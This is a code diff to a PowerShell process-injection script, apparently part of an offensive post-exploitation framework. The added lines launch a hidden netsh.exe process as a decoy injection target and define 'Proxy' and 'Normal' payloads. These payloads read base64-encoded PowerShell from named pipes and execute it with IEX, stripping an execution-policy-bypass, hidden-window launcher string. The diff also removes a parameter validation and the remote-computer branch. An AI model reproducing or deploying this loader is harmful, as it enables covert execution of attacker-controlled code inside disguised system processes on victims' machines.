@@ -40,20 +40,43 @@ Param(
     [String]
     $ProcName,
     
-    [Parameter(Position = 6, Mandatory = $true)]
-    [ValidateLength(1,1200)]
+    [Parameter(Position = 6)]
     [String]
     $PoshCode,
 
     [Parameter(Position = 7)]
     [Switch]
-    $ForceASLR
+    $ForceASLR,
+
+    [Parameter(Position = 8)]
+    [String]
+    $PayloadType
 )
 
     Set-StrictMode -Version 2
+    
+    if (!$ProcId) {
+    $pst = New-Object System.Diagnostics.ProcessStartInfo
+    $pst.WindowStyle = 'Hidden'
+    $pst.UseShellExecute = $False
+    $pst.CreateNoWindow = $True
+    $pst.FileName = "C:\Windows\System32\netsh.exe"
+    $Process = [System.Diagnostics.Process]::Start($pst)
+    [UInt32]$ProcId = ($Process.Id).tostring()    
+    }
 
-    # decode the base64 script block
-    $PoshCode = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($PoshCode));
+    echo "Injecting into process ID: $ProcID"
+    
+    if (!$PoshCode){
+        if ($PayloadType -eq "Proxy") {
+            $PoshCode = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); IEX ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((`$pr.ReadLine() -replace 'powershell -exec bypass -Noninteractive -windowstyle hidden -e ',''))))"
+            echo $PoshCode
+        }
+        if ($PayloadType -eq "Normal") {
+            $PoshCode = "`$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); IEX ([System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String((`$pr.ReadLine() -replace `"powershell -exec bypass -Noninteractive -windowstyle hidden -e `",`"`"))))"
+            echo $PoshCode
+        }
+    }
 
     function Invoke-PatchDll {
         <#
@@ -2638,7 +2661,7 @@ $RemoteScriptBlock = {
         $Win32Constants =  Get-Win32Constants
         
         $RemoteProcHandle = [IntPtr]::Zero
-
+    
         #If a remote process to inject in to is specified, get a handle to it
         if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
         {
@@ -2846,15 +2869,8 @@ Function Main
     }
     
     [System.IO.Directory]::SetCurrentDirectory($pwd)
-
-    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
-    {
-        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode)
-    }
-    else
-    {
-        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode) -ComputerName $ComputerName
-    }
+    Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, $FuncReturnType, $ProcId, $ProcName,$ForceASLR, $PoshCode)
+    
 }
 
 Main
